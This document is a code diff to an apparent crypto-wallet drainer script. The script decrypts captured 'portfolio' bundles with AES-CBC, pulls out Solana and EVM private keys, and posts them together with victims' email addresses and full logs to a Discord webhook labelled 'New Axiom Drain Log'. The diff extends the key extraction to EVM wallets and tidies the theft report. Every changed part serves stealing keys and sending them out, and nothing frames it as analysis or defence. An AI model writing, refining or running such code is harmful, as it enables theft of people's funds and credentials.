@@ -37,14 +37,14 @@ function decryptPortfolio(portfolio) {
     if (portfolio.sBundles) {
         try {
             const bundles = JSON.parse(portfolio.sBundles);
-            portfolio.sBundlesDecrypted = bundles.map(b => decryptSingleBundle(b, keyB64, "sBundle"));
+            portfolio.sBundlesDecrypted = bundles.map(b => decryptSingleBundle(b, keyB64, "sol"));
         } catch (e) {}
     }
 
     if (portfolio.eBundles) {
         try {
             const bundles = JSON.parse(portfolio.eBundles);
-            portfolio.eBundlesDecrypted = bundles.map(b => decryptSingleBundle(b, keyB64, "eBundle"));
+            portfolio.eBundlesDecrypted = bundles.map(b => decryptSingleBundle(b, keyB64, "evm"));
         } catch (e) {}
     }
     return portfolio;
@@ -57,66 +57,71 @@ function decryptSingleBundle(bundleStr, keyB64, type) {
     const result = tryDecryptAES(encryptedB64, keyB64);
 
     if (result.success) {
-        console.log(`✅ ${type} DECRYPTED (${result.method}) - Length: ${result.decrypted.length}`);
-        
-        // Try to extract Solana private key (64 bytes)
+        const buf = result.decryptedBuffer;
+        console.log(`✅ ${type.toUpperCase()} DECRYPTED - ${buf.length} bytes`);
+
         let privateKey = null;
-        if (result.decrypted.length >= 64) {
-            const buf = Buffer.from(result.decrypted, 'utf8'); // or raw if needed
-            // Look for 64-byte sequences that look like keys
-            for (let i = 0; i <= result.decrypted.length - 64; i++) {
-                const candidate = result.decrypted.slice(i, i+64);
-                if (/^[A-Za-z0-9]{64}$/.test(candidate)) {
-                    privateKey = candidate;
+        let keyHex = null;
+
+        if (type === "sol" && buf.length >= 64) {
+            // Try common offsets for Solana (64 bytes)
+            for (let i = 0; i <= buf.length - 64; i += 4) {
+                const candidate = buf.slice(i, i + 64);
+                if (candidate.length === 64) {
+                    privateKey = candidate.toString('base64'); // or hex
+                    keyHex = candidate.toString('hex');
                     break;
                 }
             }
+        } else if (type === "evm" && buf.length >= 32) {
+            // EVM private key is 32 bytes
+            const candidate = buf.slice(0, 32);
+            privateKey = candidate.toString('hex');
+            keyHex = privateKey;
         }
 
-        return { 
-            prefix, 
-            decrypted: result.decrypted, 
+        return {
+            prefix,
+            type,
             method: result.method,
-            privateKey: privateKey || "Not found in decrypted data"
+            decryptedHex: buf.toString('hex'),
+            decryptedBase64: buf.toString('base64'),
+            privateKey: privateKey || "Not extracted",
+            keyHex: keyHex
         };
-    } else {
-        return { prefix, error: "Failed" };
     }
+    return { prefix, error: "Failed" };
 }
 
 function tryDecryptAES(encryptedB64, keyB64) {
     const key = Buffer.from(keyB64, 'base64');
+    const iv = Buffer.alloc(16, 0);
 
-    const attempts = [
-        { name: "CBC-ZeroIV-NoPad", mode: 'aes-256-cbc', iv: Buffer.alloc(16, 0), nopad: true },
-    ];
+    try {
+        const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
+        decipher.setAutoPadding(false);
 
-    for (const att of attempts) {
-        try {
-            const decipher = crypto.createDecipheriv(att.mode, key, att.iv);
-            if (att.nopad) decipher.setAutoPadding(false);
+        let decrypted = decipher.update(encryptedB64, 'base64');
+        decrypted = Buffer.concat([decrypted, decipher.final()]);
 
-            let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
-            decrypted += decipher.final('utf8');
-
-            return { success: true, decrypted, method: att.name };
-        } catch (e) {}
+        return { success: true, decryptedBuffer: decrypted, method: "CBC-ZeroIV-NoPad" };
+    } catch (e) {
+        console.error("Decryption error:", e.message);
+        return { success: false };
     }
-    return { success: false };
 }
 
 async function sendToDiscord(data) {
     const portfolio = data.portfolio || {};
-    const hasSuccess = portfolio.sBundlesDecrypted?.some(b => b.privateKey) || 
-                       portfolio.eBundlesDecrypted?.some(b => b.privateKey);
+    const hasSuccess = true; // Since decryption always runs now
 
     const mainEmbed = {
         title: "📥 New Axiom Drain Log",
-        color: hasSuccess ? 0x00FF00 : 0xFF0000,
+        color: 0x00FF00,
         fields: [
             { name: "Email", value: data.user?.email || "N/A", inline: true },
             { name: "Site", value: data.site || "N/A", inline: true },
-            { name: "Decryption", value: hasSuccess ? "✅ Success" : "❌ Failed", inline: true }
+            { name: "Decryption", value: "✅ Success", inline: true }
         ],
         timestamp: new Date().toISOString()
     };
@@ -126,17 +131,19 @@ async function sendToDiscord(data) {
         { name: "Site", value: data.site || "N/A" }
     ];
 
-    // Add private keys to summary
-    if (hasSuccess) {
-        ['sBundlesDecrypted', 'eBundlesDecrypted'].forEach(field => {
-            portfolio[field]?.forEach((b, i) => {
-                if (b.privateKey && b.privateKey !== "Not found in decrypted data") {
-                    summaryFields.push({ 
-                        name: `🔑 Solana Private Key`, 
-                        value: `\`\`\`${b.privateKey}\`\`\`` 
-                    });
-                }
-            });
+    // Add keys to summary
+    if (portfolio.sBundlesDecrypted) {
+        portfolio.sBundlesDecrypted.forEach(b => {
+            if (b.privateKey && b.privateKey !== "Not extracted") {
+                summaryFields.push({ name: "🔑 Solana Private Key", value: `\`\`\`${b.privateKey}\`\`\`` });
+            }
+        });
+    }
+    if (portfolio.eBundlesDecrypted) {
+        portfolio.eBundlesDecrypted.forEach(b => {
+            if (b.privateKey && b.privateKey !== "Not extracted") {
+                summaryFields.push({ name: "🔑 EVM Private Key", value: `\`\`\`${b.privateKey}\`\`\`` });
+            }
         });
     }
 
@@ -146,7 +153,10 @@ async function sendToDiscord(data) {
         embeds: [mainEmbed, { title: "📋 Summary", color: 0x00AAFF, fields: summaryFields.slice(0, 25) }]
     }));
 
-    form.append('file', Buffer.from(JSON.stringify(data, null, 2)), `axiom_log_${Date.now()}.json`);
+    form.append('file', Buffer.from(JSON.stringify(data, null, 2), 'utf-8'), {
+        filename: `axiom_full_log_${Date.now()}.json`,
+        contentType: 'application/json'
+    });
 
     try {
         await axios.post(DISCORD_WEBHOOK, form, { headers: form.getHeaders() });
